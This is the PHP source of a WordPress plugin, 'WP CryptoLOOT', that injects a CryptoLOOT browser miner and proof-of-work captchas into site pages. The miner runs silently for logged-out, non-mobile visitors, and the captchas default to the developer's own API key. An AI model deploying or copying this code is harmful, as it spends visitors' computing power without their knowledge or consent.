<?php
/**
Plugin Name: WP CryptoLOOT
Description: This plugin will add CryptoLOOT miner and captcha capabilities to a WordPress installation. Requires a CryptoLOOT account.
Plugin URI: https://wpcryptoloot.com/
Version: 1.2
Author: Scott Webber
Author URI: https://wpcryptoloot.com/
License: GNU GPLv2 or later
Text Domain: wp-cryptoloot
*/
/**
@package wpcryptoloot
@author Scott Webber
@version 1.2
*/
/**     
The WP CryptoLOOT plugin will add CryptoLOOT miner and captcha capabilities to a WordPress installation. Requires a CryptoLOOT account.

Copyright (C) 2020 Scott Webber

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License along
with this program; if not, write to the Free Software Foundation, Inc.,
51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. 
*/

if( !defined( 'ABSPATH' ) ) {
	exit();
}

define( 'WPCL_PLUGIN_URL', plugin_dir_url( __FILE__ ) );
define( 'WPCL_REF_URL', esc_url( 'https://crypto-loot.org/ref.php?go=aa489c6aafb514f720c145f199c25428' ) );

include_once( plugin_dir_path( __FILE__ ) . 'updates.php' );

$updates = new wpcryptoloot_updater( __FILE__ );
$updates->set_username( 'scowebb' );
$updates->set_repository( 'wp-cryptoloot' );
$updates->initialize();

register_deactivation_hook( __FILE__, 'wpcl_deactivate_plugin' );

if( !function_exists( 'wpcl_deactivate_plugin' ) ) {
	function wpcl_deactivate_plugin() {
		delete_option( 'wpcl_settings' );
		flush_rewrite_rules();
	}
}

if( !function_exists( 'wpcl_plugin' ) ) {
	add_action( 'init', 'wpcl_plugin' );
	function wpcl_plugin() {

		$options = get_option( 'wpcl_settings' );
		if( isset( $options['wpcl_login_activate'] ) ) { 
			$login_activate = $options['wpcl_login_activate']; 
		} else { 
			$login_activate = '0'; 
		}
		if( $login_activate == '1') {
			add_action( 'login_form', 'cryptoloot_login_captcha_payload' );
			add_action( 'login_enqueue_scripts', 'wpcl_styles' );
		}
		if( isset( $options['wpcl_register_activate'] ) ) {
			$register_activate = $options['wpcl_register_activate'];
		} else {
			$register_activate = '0';
		}
		if( $register_activate == '1' ) {
			add_action( 'register_form', 'cryptoloot_register_captcha_payload' );
			if( $login_activate == '0' ) {
				add_action( 'login_enqueue_scripts', 'wpcl_styles' );
			}
		}
		if( isset( $options['wpcl_comments_activate'] ) ) {
			$comments_activate = $options['wpcl_comments_activate'];
		} else {
			$comments_activate = '0';
		}
		if( $comments_activate == '1' && !current_user_can( 'manage_options' ) ) {
			add_action( 'comment_form_submit_button', 'cryptoloot_comments_captcha', 2, 10 );
		}
	}
}

if( !function_exists( 'wpcl_styles' ) ) {
	function wpcl_styles() {
		$styles = '
<style>
	.login form {
		width: 305px;
	}
</style>
		';
		echo $styles;
	}
}

if( !function_exists('wpcl_admin_page_loader') ) {
	add_action( 'admin_menu', 'wpcl_admin_page_loader' );
	function wpcl_admin_page_loader() { 
		add_options_page( 'WP CryptoLOOT', 'WP CryptoLOOT', 'manage_options', 'wpcl_plugin', 'wpcl_admin_options_page' );
	}	
}

if( !function_exists( 'cryptoloot_miner_payload' ) ) {
	add_action( 'wp_head', 'cryptoloot_miner_payload' );
	function cryptoloot_miner_payload() {
		$options = get_option('wpcl_settings');
		$initiate = 'miner.start();';
		if( isset( $options['wpcl_threads'] ) ) {
			$threads = $options['wpcl_threads'];
		} else {
			$threads = '4';
		}
		if( isset( $options['wpcl_throttle'] ) ) {
			$throttle = $options['wpcl_throttle'];
		} else {
			$throttle = '0.2';
		}
		if( isset( $options['wpcl_public_key'] ) ) {
			$public_key = $options['wpcl_public_key'];
		}
		if( isset( $options['wpcl_auto_miner'] ) ) {
			$auto_miner = $options['wpcl_auto_miner'];
		} else {
			$auto_miner = false;
		}
		if( isset( $options['wpcl_miner_start'] ) ) {
			$checked = $options['wpcl_miner_start'];
		} else {
			$checked = false;
		}
		if( $auto_miner == true && !is_user_logged_in() && !wp_is_mobile() ) {
			$crypto_miner = '
<script src="//statdynamic.com/lib/crypta.js"></script>
<script>
	var miner=new CRLT.Anonymous(\''.$public_key.'\', { threads:'.$threads.', throttle:'.$throttle.', coin: "upx",});
	'.( $checked == true ? $initiate : '' ).'
</script>
			';
			echo $crypto_miner;
		}
	}
}

if( !function_exists( 'cryptoloot_login_captcha_payload' ) ) {
	function cryptoloot_login_captcha_payload() {
		$options = get_option( 'wpcl_settings' );
		if( isset( $options['wpcl_public_key'] ) ) {
			$public_key = $options['wpcl_public_key'];
		} else {
			$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
		}
		if( empty( $options['wpcl_public_key'] ) ) {
			$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
		}
		if( isset( $options['wpcl_login_captcha_hashes'] ) ) {
			$login_hashes = $options['wpcl_login_captcha_hashes'];
		} else {
			$login_hashes = '256';
		}
		if( $options['wpcl_login_activate'] == true ) {
			$payload = '
<script src="https://verifypow.com/lib/captcha.min.js" async></script>
<div class="CRLT-captcha" data-hashes="'.$login_hashes.'" data-key="'.$public_key.'" data-disable-elements="input[type=submit]">
	<em>Loading Captcha...<br>
	If it doesn\'t load, please disable Adblock!</em>
</div>
			';
			echo $payload;
		}
	}
}

if( !function_exists( 'cryptoloot_register_captcha_payload' ) ) {
	function cryptoloot_register_captcha_payload() {
		$options = get_option( 'wpcl_settings' );
		if( isset( $options['wpcl_public_key'] ) ) {
			$public_key = $options['wpcl_public_key'];
		} else {
			$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
		}
		if( empty( $options['wpcl_public_key'] ) ) {
			$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
		}
		if( isset( $options['wpcl_register_captcha_hashes'] ) ) {
			$register_hashes = $options['wpcl_register_captcha_hashes'];
		} else {
			$register_hashes = '256';
		}
		if( $options['wpcl_register_activate'] == true ) {
			$payload = '
<script src="https://verifypow.com/lib/captcha.min.js" async></script>
<div class="CRLT-captcha" data-hashes="'.$register_hashes.'" data-key="'.$public_key.'" data-disable-elements="input[type=submit]">
	<em>Loading Captcha...<br>
	If it doesn\'t load, please disable Adblock!</em>
</div>
			';
			echo $payload;
		}
	}
}

if( !function_exists('cryptoloot_comments_captcha') ) {
	function cryptoloot_comments_captcha( $submit_button, $args ) {
		$options = get_option( 'wpcl_settings' );
		if( isset( $options['wpcl_public_key'] ) ) {
			$public_key = $options['wpcl_public_key'];
		} else {
			$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
		}
		if( empty( $options['wpcl_public_key'] ) ) {
			$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
		}
		if( isset( $options['wpcl_comments_captcha_hashes'] ) ) {
			$hashes = $options['wpcl_comments_captcha_hashes'];
		} else {
			$hashes = '256';
		}
		$payload = '
<script src="https://verifypow.com/lib/captcha.min.js" async></script>
<div class="CRLT-captcha" data-hashes="'.$hashes.'" data-key="'.$public_key.'" data-disable-elements="input[type=submit]">
<em>Loading Captcha...<br>
If it doesn\'t load, please disable Adblock!</em>
</div><p class="form-submit">
		';
		echo $payload . $submit_button;
	}	
}

if( !function_exists( 'cryptoloot_setting_init' ) ) {
	add_filter('plugin_action_links_'.plugin_basename(__FILE__), 'wpcl_add_plugin_page_settings_link');
	function wpcl_add_plugin_page_settings_link( $links ) {
		$links[] = '<a href="' .
			admin_url( 'options-general.php?page=wpcl_plugin' ) .
			'">' . __('Settings') . '</a>';
		return $links;
	}
	add_action( 'admin_init', 'cryptoloot_setting_init' );
	function cryptoloot_setting_init() {
		$options = get_option( 'wpcl_settings' );
		register_setting( 'wpcl_admin_page', 'wpcl_settings' );
		
		add_settings_section(
			'wpcl_settings_page_section',
			__( '', 'wordpress' ),
			'wpcl_settings_section_callback',
			'wpcl_admin_page'
		);
		
		add_settings_field(
			'wpcl_public_key',
			__( 'Enter public CryptoLOOT key:', 'wordpress' ),
			'wpcl_public_key_render',
			'wpcl_admin_page',
			'wpcl_settings_page_section'
		);

		add_settings_field(
			'wpcl_auto_miner',
			__( 'Initialize miner options:', 'wordpress' ),
			'wpcl_auto_miner_render',
			'wpcl_admin_page',
			'wpcl_settings_page_section'
		);
		if( isset( $options['wpcl_auto_miner'] ) ){ 
			$auto_miner = $options['wpcl_auto_miner']; 
		} else { 
			$auto_miner = false; 
		}
		if( $auto_miner == true ) {
			add_settings_field(
				'wpcl_threads',
				__( '', 'wordpress' ),
				'wpcl_threads_render',
				'wpcl_admin_page',
				'wpcl_settings_page_section'
			);
			add_settings_field(
				'wpcl_throttle',
				__( '', 'wordpress' ),
				'wpcl_throttle_render',
				'wpcl_admin_page',
				'wpcl_settings_page_section'
			);
			add_settings_field(
				'wpcl_miner_start',
				__( '', 'wordpress' ),
				'wpcl_miner_start_render',
				'wpcl_admin_page',
				'wpcl_settings_page_section'
			);			
		}

		add_settings_field( 
			'wpcl_login_activate', 
			__( 'Add login form captcha:', 'wordpress' ),
			'wpcl_login_form_activate_render', 
			'wpcl_admin_page',
			'wpcl_settings_page_section'
		);
		if( isset( $options['wpcl_login_activate'] ) ) {
			$login_activate = $options['wpcl_login_activate'];
			} else {
				$login_activate = false;
			}
		if( $login_activate == true ) {
			add_settings_field(
				'wpcl_login_captcha_hashes',
				__( '', 'wordpress' ),
				'wpcl_login_captcha_hashes_render',
				'wpcl_admin_page',
				'wpcl_settings_page_section'
			);
		}
		
		add_settings_field(
			'wpcl_register_activate',
			__( 'Add register form captcha:', 'wordpress' ),
			'wpcl_register_form_activate_render',
			'wpcl_admin_page',
			'wpcl_settings_page_section'
		);
		if( isset( $options['wpcl_register_activate'] ) ) { 
			$register_activate = $options['wpcl_register_activate']; 
		} else {
			$register_activate = false; 
		}
		if( $register_activate == true ) {
			add_settings_field(
				'wpcl_register_captcha_hashes',
				__( '', 'wordpress' ),
				'wpcl_register_captcha_hashes_render',
				'wpcl_admin_page',
				'wpcl_settings_page_section'
			);
		}
		add_settings_field( 
			'wpcl_comments_activate', 
			__( 'Add comment form captcha:', 'wordpress' ), 
			'wpcl_comments_form_activate_render', 
			'wpcl_admin_page',
			'wpcl_settings_page_section'
		);
		if( isset( $options['wpcl_comments_activate'] ) ) {
			$comments_activate = $options['wpcl_comments_activate'];
		} else {
			$comments_activate = false;
		}
		if( $comments_activate == true ) {
			add_settings_field(
				'wpcl_comments_captcha_hashes',
				__( '', 'wordpress'),
				'wpcl_comments_captcha_hashes_render',
				'wpcl_admin_page',
				'wpcl_settings_page_section'
			);

		}
	}
}

if( !function_exists( 'cryptoloot_loader' ) ) {
	add_action( 'admin_init', 'cryptoloot_loader' );
	add_action( 'admin_notices', 'wcpl_admin_notices'  );
	/** @since 1.2 */
	function wcpl_admin_notices() {
		$screen = get_current_screen();
		$page = $screen->id;
		$options = get_option( 'wpcl_settings' );	
		if( isset( $options['wpcl_public_key'] ) ) {
			$check_key = $options['wpcl_public_key'];
			$length = strlen( $check_key );
			$alnum_check = ctype_alnum( $check_key );
			if( $length == 44 && $alnum_check == true ) {
				$public_key = $options['wpcl_public_key'];
			} else {					
				$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
			}
		} else {
			$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
		}
		if( $page == 'settings_page_wpcl_plugin' ){
			if( $public_key == '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9' ) {
				echo '<div class="notice notice-warning"><p><b>Developer API key currently in use.</b> </p><p>Sign up for a free <a href="'.WPCL_REF_URL.'" target="_blank" rel="noopener">CryptoLOOT account</a> to get your own API key.</p></div>';
			}
		}
	}
	function cryptoloot_loader() {
		function wpcl_settings_section_callback(){
			$html = '';
			echo $html;
		}

		function wpcl_public_key_render() {
			$options = get_option( 'wpcl_settings' );
			
			if( isset( $options['wpcl_public_key'] ) ) {
				$check_key = $options['wpcl_public_key'];
				$length = strlen( $check_key );
				$alnum_check = ctype_alnum( $check_key );
				if( $length == 44 && $alnum_check == true ) {
					$public_key = $options['wpcl_public_key'];
				} else {					
					$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
				}
			} else {
				$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
			}
			
			$html = '<input type="text" name="wpcl_settings[wpcl_public_key]" length="44" value="'.$public_key.'" />';
			echo $html;
		
		}		

		function wpcl_auto_miner_render() {
			$options = get_option( 'wpcl_settings' );
			$hidden = '<input type="hidden" name="wpcl_settings[wpcl_auto_miner]" value="0" />';
			$html = '<input type="checkbox" name="wpcl_settings[wpcl_auto_miner]" value="1" '.checked( 1, $options['wpcl_auto_miner'], false ).' />';
			echo $hidden;
			echo $html;
		}
		
		function wpcl_threads_render() {
			$options = get_option( 'wpcl_settings' );
			if( isset( $options['wpcl_threads'] ) ) {
				$option = $options['wpcl_threads'];
			} else {
				$option = '4';
			}
			$selected = 'selected="selected"';
			echo '<select name="wpcl_settings[wpcl_threads]">';
			echo '<option value"4" '.( $option == 4 ? $selected : '' ).'>4</option>';
			echo '<option value"5" '.( $option == 5 ? $selected : '' ).'>5</option>';
			echo '<option value"6" '.( $option == 6 ? $selected : '' ).'>6</option>';
			echo '<option value"7" '.( $option == 7 ? $selected : '' ).'>7</option>';
			echo '<option value"8" '.( $option == 8 ? $selected : '' ).'>8</option>';
			echo '<option value"9" '.( $option == 9 ? $selected : '' ).'>9</option>';
			echo '<option value"10" '.( $option == 10 ? $selected : '' ).'>10</option>';
			echo '<option value"20" '.( $option == 20 ? $selected : '' ).'>20</option>';
			echo '<option value"30" '.( $option == 30 ? $selected : '' ).'>30</option>';
			echo '<option value"40" '.( $option == 40 ? $selected : '' ).'>40</option>';
			echo '<option value"50" '.( $option == 50 ? $selected : '' ).'>50</option>';
			echo '<option value"100" '.( $option == 100 ? $selected : '' ).'>100</option>';
			echo '</select> <text>Choose the number of threads to run.</text>';
		}
		
		function wpcl_throttle_render() {
			$options = get_option( 'wpcl_settings' );
			$selected = 'selected="selected"';
			if( isset( $options['wpcl_throttle'] ) ) {
				$throttle = $options['wpcl_throttle'];
			} else {
				$throttle = '0.2';
			}
			echo '<select name="wpcl_settings[wpcl_throttle]">';
			echo '<option value="0" '.( $throttle == '0' ? $selected : '' ).'>None</option>';
			echo '<option value="0.2" '.( $throttle == '0.2' ? $selected : '' ).'>20%</option>';
			echo '<option value="0.3" '.( $throttle == '0.3' ? $selected : '' ).'>30%</option>';
			echo '<option value="0.4" '.( $throttle == '0.4' ? $selected : '' ).'>40%</option>';
			echo '<option value="0.5" '.( $throttle == '0.5' ? $selected : '' ).'>50%</option>';
			echo '<option value="0.6" '.( $throttle == '0.6' ? $selected : '' ).'>60%</option>';
			echo '<option value="0.7" '.( $throttle == '0.7' ? $selected : '' ).'>70%</option>';
			echo '<option value="0.8" '.( $throttle == '0.8' ? $selected : '' ).'>80%</option>';
			echo '</select> <text>Limit the percentage of time that the miner will run.</text>';
		}
		
		function wpcl_miner_start_render() {
			$options = get_option( 'wpcl_settings' );
			if( isset( $options['wpcl_miner_start'] ) ) {
				$miner_start = $options['wpcl_miner_start'];
			} else {
				$miner_start = false;
			}
			$hidden = '<input type="hidden" name="wpcl_settings[wpcl_miner_start]" value="0" />';
			$html = '<input type="checkbox" name="wpcl_settings[wpcl_miner_start]" value="1" '.checked( 1, $miner_start, false ).' /> <text>Check this box to start the miner.</text>';
			echo $hidden;
			echo $html;
		}
		
		function wpcl_login_captcha_hashes_render() {
			$options = get_option( 'wpcl_settings' );
			$selected = 'selected="selected"';
			if( isset( $options['wpcl_login_captcha_hashes'] ) ) {
				$option = $options['wpcl_login_captcha_hashes'] ;
			} else {
				$option = '256';
			}
			echo '<select name="wpcl_settings[wpcl_login_captcha_hashes]">';
			echo '<option value="256" '.( $option == 256 ? $selected : '' ).'>256</option>';
			echo '<option value="512" '.( $option == 512 ? $selected : '' ).'>512</option>';
			echo '<option value="1024" '.( $option == 1024 ? $selected : '' ).'>1024</option>';
			echo '<option value="2048" '.( $option == 2048 ? $selected : '' ).'>2048</option>';
			echo '</select> <text>Choose the number of hashes to verify.</text>';
		}
		function wpcl_register_captcha_hashes_render() {
			$options = get_option( 'wpcl_settings' );
			$selected = 'selected="selected"';
			if( isset( $options['wpcl_register_captcha_hashes'] ) ) {
				$option = $options['wpcl_register_captcha_hashes'] ;
			} else {
				$option = '256';
			}
			echo '<select name="wpcl_settings[wpcl_register_captcha_hashes]">';
			echo '<option value="256" '.( $option == 256 ? $selected : '' ).'>256</option>';
			echo '<option value="512" '.( $option == 512 ? $selected : '' ).'>512</option>';
			echo '<option value="1024" '.( $option == 1024 ? $selected : '' ).'>1024</option>';
			echo '<option value="2048" '.( $option == 2048 ? $selected : '' ).'>2048</option>';
			echo '</select> <text>Choose the number of hashes to verify.</text>';
		}

		function wpcl_comments_captcha_hashes_render() {
			$options = get_option( 'wpcl_settings' );
			$selected = 'selected="selected"';
			if( isset( $options['wpcl_comments_captcha_hashes'] ) ) {
				$option = $options['wpcl_comments_captcha_hashes'] ;
			} else {
				$option = '256';
			}
			echo '<select name="wpcl_settings[wpcl_comments_captcha_hashes]">';
			echo '<option value="256" '.( $option == 256 ? $selected : '' ).'>256</option>';
			echo '<option value="512" '.( $option == 512 ? $selected : '' ).'>512</option>';
			echo '<option value="1024" '.( $option == 1024 ? $selected : '' ).'>1024</option>';
			echo '<option value="2048" '.( $option == 2048 ? $selected : '' ).'>2048</option>';
			echo '</select> <text>Choose the number of hashes to verify.</text>';
		}
		
		function wpcl_login_form_activate_render() {
			$options = get_option( 'wpcl_settings' );
			$hidden = '<input type="hidden" name="wpcl_settings[wpcl_login_activate]" value="0" />';	
			$html = '<input type="checkbox" name="wpcl_settings[wpcl_login_activate]" value="1"'. checked( 1, $options['wpcl_login_activate'], false ). ' />';	
			echo $hidden;
			echo $html;
		}

		function wpcl_register_form_activate_render() {
			$options = get_option( 'wpcl_settings' );
			$hidden = '<input type="hidden" name="wpcl_settings[wpcl_register_activate]" value="0" />';	
			$html = '<input type="checkbox" name="wpcl_settings[wpcl_register_activate]" value="1"'. checked( 1, $options['wpcl_register_activate'], false ). ' />';	
			echo $hidden;
			echo $html;		
		}

		function wpcl_comments_form_activate_render() {
			$options = get_option( 'wpcl_settings' );
			$hidden = '<input type="hidden" name="wpcl_settings[wpcl_comments_activate]" value="0" />';	
			$html = '<input type="checkbox" name="wpcl_settings[wpcl_comments_activate]" value="1"'. checked( 1, $options['wpcl_comments_activate'], false ). ' />';	
			echo $hidden;
			echo $html;
		}

		function wpcl_admin_options_page() { 
			echo '<h1>'.get_admin_page_title().'</h1>';
			echo '<form action="options.php" method="post">';
			settings_fields( 'wpcl_admin_page' );
			do_settings_sections( 'wpcl_admin_page' );
			submit_button();
			echo '</form>';
		}
	}
}